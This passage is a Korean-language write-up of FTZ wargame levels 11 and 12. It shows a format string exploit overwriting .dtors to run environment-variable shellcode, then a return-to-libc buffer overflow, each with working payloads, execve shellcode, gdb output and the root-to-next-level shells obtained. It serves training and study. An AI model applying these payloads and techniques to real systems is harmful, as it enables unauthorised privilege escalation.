
  4. 'attackme' 파일 포멧 스트링 취약점 찾기

  [level11@ftz level11]$ cat hint

  #include <stdio.h>
  #include <stdlib.h>

  int main( int argc, char *argv[] )
  {
          char str[256];

          setreuid( 3092, 3092 );
          strcpy( str, argv[1] );
          printf( str );
  }


  [level11@ftz tmp]$ cd
  [level11@ftz level11]$ ./attackme aaaa
  aaaa

  [level11@ftz level11]$ ./attackme "%x %x %x %x"
  bffffc19 bfffde60 1 25207825

  [level11@ftz level11]$ ./attackme "%8x %8x %8x %8x"
  bffffc15 bfffde60        1 20783825

  [level11@ftz level11]$ ./attackme "%08x %08x %08x %08x"
  bffffc11 bfffe7e0 00000001 78383025

  [level11@ftz level11]$ ./attackme "aaaa %08x %08x %08x %08x"
  aaaa bffffc0c bfffe3d0 00000001 61616161
   // printf 함수와 main 함수의 버퍼 거리는 12byte가 된다.


  5. FSB 공격 준비 단계

   - main 함수의 버퍼와 printf 함수의 거리가 몇 byte인지 확인한다.
   - 쉘 코드 주소를 삽입할 리턴 주소 또는 _DTOR_END_(소멸자)를 찾는다.
   - 쉘 코드를 환경 변수에 등록한 이후 쉘 코드 주소를 찾는다.
   - 그리고 포멧 스트링 '%n'을 이용하여 쉘 코드 주소 값을 리턴 주소에 삽입해야하는 페이로드를 제작한다.
   - 이때, '%n'을 이용하기 때문에 쉘 코드 주소 값은 10진수로 삽입해야 한다.

   1) main 함수의 버퍼와 printf 함수의 거리가 몇 byte인지 확인한다.

  [level11@ftz level11]$ ./attackme "aaaa %08x %08x %08x %08x"
  aaaa bffffc0c bfffe3d0 00000001 61616161
   // printf 함수와 main 함수의 버퍼 거리는 12byte가 된다.


   2) 쉘 코드를 삽입할 리턴 주소 또는 _DTOR_END_(소멸자)를 찾는다.

   - .dtors(소멸자) : main 함수 수행 종료 이후 바로 실행
   - .ctors(생성자) : main 함수 수행 시작 이전 바로 실행

   - 만약, 안티디비깅 기법에 의해서 리턴 주소 파악이 어려운 경우, .dtors(소멸자) 주소를 사용한다.
   - main 함수 종료 후에 .dtors 속성의 함수가 실행되기 때문에 이 부분에 쉘 코드가 있는 주소 값을 입력하면
     쉘 코드를 실행할 수 있다.

   - _DTOR_END_ 주소 확인 명령어 : nm, objdump

  [level11@ftz level11]$ nm attackme
  ~ 중간 생략 ~
  08049610 d __DTOR_END__
  0804960c d __DTOR_LIST__
  ~ 중간 생략 ~

  [level11@ftz level11]$ objdump -s -j .dtors attackme

  attackme:     file format elf32-i386

  Contents of section .dtors:
   804960c ffffffff 00000000                    ........


   3) 쉘 코드를 환경 변수에 등록한 이후 쉘 코드 주소를 찾는다.

   - 25byte 쉘 코드
   - '\x90'는 NOP 코드라하여 아무 동작를 수행하지 않는다.

  [level11@ftz level11]$ export SHELLCODE=$(python -c 'print("\x90"*100+"\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x53\x89\xe1\x89\xc2\xb0\x0b\xcd\x80")')


  [level11@ftz level11]$ cd tmp
  [level11@ftz tmp]$ vi shellcode.c

  #include <stdio.h>
  #include <stdlib.h>

  int main( int argc, char *argv[] )
  {
  	char *env;

  	env = getenv(argv[1]);  // getenv 함수를 이용하여 인자의 환경 변수를 가져옴
  	printf("SHELLCODE Address : =%p\n", env);

  }

  [level11@ftz tmp]$ gcc -o shellcode shellcode.c

  [level11@ftz tmp]$ ./shellcode SHELLCODE
  SHELLCODE Address : = 0xbffffbc3


   4) FSB를 하기 위한 찾은 정보

  printf와 버퍼 사이의 거리		12byte
  _DTOR_END_(소멸자) 주소		0x08049610
  환경 변수로 등록한 쉘 코드 주소	0xbffffbc3



  6. FSB 공격을 하기 위한 페이로드 제작

   1) SHELLCODE 환경 변수 주소 2byte 단위 생성

   - '%n'을 이용하여 해당 주소를 입력할때 10진수로 입력해야 한다.
   - 쉘 코드의 환경 변수 주소 값 '0xbffffbc3'는 10진수로 변경하면 '3221224387'되므로 int 범위를 벗어난다.
   - 그렇기 때문에 환경 변수 주소 '0xbffffbc3'를 2Byte씩 분할해야 한다.
   - 2byte 씩 분할하면 다음과 같다.

  쉘 코드 주소	16진수		10진수
  -------------------------------------------------------
  하위 주소  	0xfbc3		64451
  상위 주소 	0xbfff		49151


   2) _DTOR_END_(소멸자) 주소에 환경 변수 2byte씩 대입

  _DTOR_END_(소멸자) 주소		0x08049610 ~ 0x08049613

  소멸자 주소	리틀 엔디안		대입할 쉘 코드 주소 10진수 값

  0x08049610 	\x10\x96\x04\x08	64451(0xfbc3) - 40 = 64411
  0x08049612	\x12\x96\x04\x08	49151(0xbfff) - 40 - 64411 = -15300
  					// 결과 값이 음수가 나오기 때문에 보수 처리해서 계산해야함
  					114687(1bfff) - 40 - 64411 = 50236

   3) 페이로드 제작

  4자리		4자리	       4자리             4자리                   24자리
  "aaaa" + "\x10\x96\x04\x08" + "aaaa" + "\x12\x96\x04\x08" + "%08x"*3 + "%64411d%n" +"%50236d%n"


  "\x61\x61\x61\x61\x10\x96\x04\x08%d%n"




   4) FSB 공격 실시

  [level11@ftz level11]$ ./attackme `python -c 'print("aaaa" + "\x10\x96\x04\x08" + "aaaa" + "\x12\x96\x04\x08" + "%08x"*3 + "%64411d%n" +"%50236d%n")'`

        sh-2.05b$ id
  uid=3092(level12) gid=3091(level11) groups=3091(level11)
  sh-2.05b$
  sh-2.05b$ my-pass
  TERM environment variable not set.

  Level12 Password is "it is like this".

  sh-2.05b$ exit
  exit
  [level11@ftz level11]$

  ----------------------------------------------------------------------------------------
  @ Level-12 문제

   - 아이디 : level12
   - 패스워드 : it is like this


  1. 'Level-12' 문제 파악

  [level12@ftz level12]$ ls
  attackme  hint  public_html  tmp

  [level12@ftz level12]$ cat hint

  #include <stdio.h>
  #include <stdlib.h>
  #include <unistd.h>

  int main( void )
  {
          char str[256];   // char 형으로 str 변수 선언 및 배열 크기 256byte

          setreuid( 3093, 3093 );   // 다음 레벨 아이디
          printf( "문장을 입력하세요.\n" );
          gets( str );   // gets 함수에 의해서 str 변수에 입력을 받는다. (문자열의 길이를 확인 X -> BoF 발생 가능)
          printf( "%s\n", str );
  }

  [level12@ftz level12]$ ./attackme
  문장을 입력하세요.
  aaaa
  aaaa


  2. 'attackme' gdb 분석

  [level12@ftz level12]$ cp attackme tmp
  [level12@ftz level12]$ cd tmp
  [level12@ftz tmp]$ gdb -q attackme
  [level12@ftz tmp]$ gdb -q attackme
  Reading symbols from /home/level12/tmp/attackme...done.
  (gdb) disas main
  Dump of assembler code for function main:
     0x08048470 <+0>:     push   %ebp
     0x08048471 <+1>:     mov    %esp,%ebp
   - 함수 프롤로그

     0x08048473 <+3>:     sub    $0x108,%esp
   - esp에서 0x108(264byte)만큼 공간을 확보한다.

     0x08048479 <+9>:     sub    $0x8,%esp
   - esp에서 0x8(8byte)만큼 공간을 확보한다.

     0x0804847c <+12>:    push   $0xc15
   - 3093를 스택에 Push 한다.

     0x08048481 <+17>:    push   $0xc15
   - 3093를 스택에 Push 한다.

     0x08048486 <+22>:    call   0x804835c <setreuid@plt>
   - setreuid 함수를 호출한다.

     0x0804848b <+27>:    add    $0x10,%esp
   - esp에서 0x10(16byte) 만큼 공간을 제거한다.

     0x0804848e <+30>:    sub    $0xc,%esp
   - esp에서 0xc(12byte)만큼 공간을 확보한다.

     0x08048491 <+33>:    push   $0x8048538
   -  "문장을 입력하세요.\n" 를 스택에 Push 한다.

     0x08048496 <+38>:    call   0x804834c <printf@plt>
   - printf 함수를 호출한다.

     0x0804849b <+43>:    add    $0x10,%esp
   - esp에서 0x10(16byte) 만큼 공간을 제거한다.

     0x0804849e <+46>:    sub    $0xc,%esp
   - esp에서 0xc(12byte)만큼 공간을 확보한다.

     0x080484a1 <+49>:    lea    -0x108(%ebp),%eax
   - [ebp-0x108]의 주소 값을 eax에 대입한다.
   - [ebp-0x108]는 str의 시작 주소이다.

     0x080484a7 <+55>:    push   %eax
   - eax를 스택에 Push 한다.

     0x080484a8 <+56>:    call   0x804831c <gets@plt>
   - gets 함수를 호출한다.

     0x080484ad <+61>:    add    $0x10,%esp
   - esp에서 0x10(16byte) 만큼 공간을 제거한다.

     0x080484b0 <+64>:    sub    $0x8,%esp
   - esp에서 0x8(8byte)만큼 공간을 확보한다.

     0x080484b3 <+67>:    lea    -0x108(%ebp),%eax
   - [ebp-0x108]의 주소 값을 eax에 대입한다.
   - [ebp-0x108]는 str의 시작 주소이다.

     0x080484b9 <+73>:    push   %eax
   - eax를 스택에 Push 한다.

     0x080484ba <+74>:    push   $0x804854c
   - 0x804854c에 있는 값을 스택에 Push 한다.
   - 0x804854c:       "%s\n"

     0x080484bf <+79>:    call   0x804834c <printf@plt>
   - printf 함수를 호출한다.

     0x080484c4 <+84>:    add    $0x10,%esp
   - esp에서 0x10(16byte) 만큼 공간을 제거한다.

     0x080484c7 <+87>:    leave
     0x080484c8 <+88>:    ret
   - 함수 에필로그
  End of assembler dump.
  (gdb)


  3. 'attackme' 스택 프레임 구조

  [낮은 주소]

  		str	256byte
  		dummy	8byte
  		sfp	4byte
  		ret	4byte
  [높은 주소]


  4. BoF 공격

   - ret 영역에 system 함수 주소 삽입
   - argv 영역에 '/bin/sh' 삽입

  [낮은 주소]

  		str	256byte
  		dummy	8byte
  		sfp	4byte
  		ret	4byte	<- system 함수 주소 값
  		argc	4byte
  		argv	4byte	<- /bin/sh 주소 값
  [높은 주소]

   1) system 함수 주소 찾기

  (gdb) b *main
  Breakpoint 1 at 0x8048470
  (gdb) run
  Starting program: /home/level12/tmp/attackme

  Breakpoint 1, 0x08048470 in main ()
  (gdb) print system
  $1 = {<text variable, no debug info>} 0x4203f2c0 <system>
  (gdb) quit
  A debugging session is active.

          Inferior 1 [process 13822] will be killed.

  Quit anyway? (y or n) y
  [level12@ftz tmp]$

   2) '/bin/sh' 주소 찾기

  [level12@ftz tmp]$ vi shell.c

  #include <stdio.h>

  int main()
  {
         long shell = 0x4203f2c0;
  	// shell 변수에 system 함수 주소 대입

         while(memcmp((void *)shell, "/bin/sh", 8)) {
         ++shell;
         }
  	// memcmp 함수 :  메모리 주소 비교 함수
  	// memcmp 함수를 이용하여 shell 변수 주소부터 시작해서 '/bin/sh' 문자열을 찾을 때 까지
  	   shell 변수 값을 증가시키는 반복문

         printf("/bin/sh = %p\n", shell);
  	// '/bin/sh' 문자열과 매칭되는 shell 변수의 주소 값을 출력
  }

  :wq

  [level12@ftz tmp]$ gcc -o shell shell.c

  [level12@ftz tmp]$ ./shell
  /bin/sh = 0x42127ea4


  5. RTL(Return To Library) 공격

   - NX bit 메모리 보호 기법를 사용하는 환경에서 실시하는 BoF 공격 기법
   - NX bit : 쉘 코드 삽입 공격을 방어하기 위해서 스택 세그먼트에 실행 권한을 제한하여
  	 스택에 쉘 코드를 저장 및 실행을 막는 메모리 보호 기법

   1) BoF 공격 구조

  [낮은 주소]

  		str	256byte
  		dummy	8byte
  		sfp	4byte
  		ret	4byte	<- system 함수 주소 값(0x4203f2c0)
  		argc	4byte
  		argv	4byte	<- /bin/sh 주소 값(0x42127ea4)
  [높은 주소]


   2) system 함수 주소 & /bin/sh 주소 -> 리틀 엔디안 방식으로 변경

  system 함수	0x4203f2c0	\xc0\xf2\x03\x42
  /bin/sh 		0x42127ea4	\xa4\x7e\x12\x42


   3) RTL을 이용한 BoF 공격 페이로드 제작

  "a"*268+"\xc0\xf2\x03\x42"+"aaaa"+"\xa4\x7e\x12\x42"

  [level12@ftz tmp]$ cd
  [level12@ftz level12]$
  [level12@ftz level12]$ (python -c 'print("a"*268+"\xc0\xf2\x03\x42"+"aaaa"+"\xa4\x7e\x12\x42")';cat) | ./attackme
  문장을 입력하세요.
  aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa쟌Baaaa?B
  id
  uid=3093(level13) gid=3092(level12) groups=3092(level12)
  my-pass

  Level13 Password is "have no clue".

  Segmentation fault
  [level12@ftz level12]$
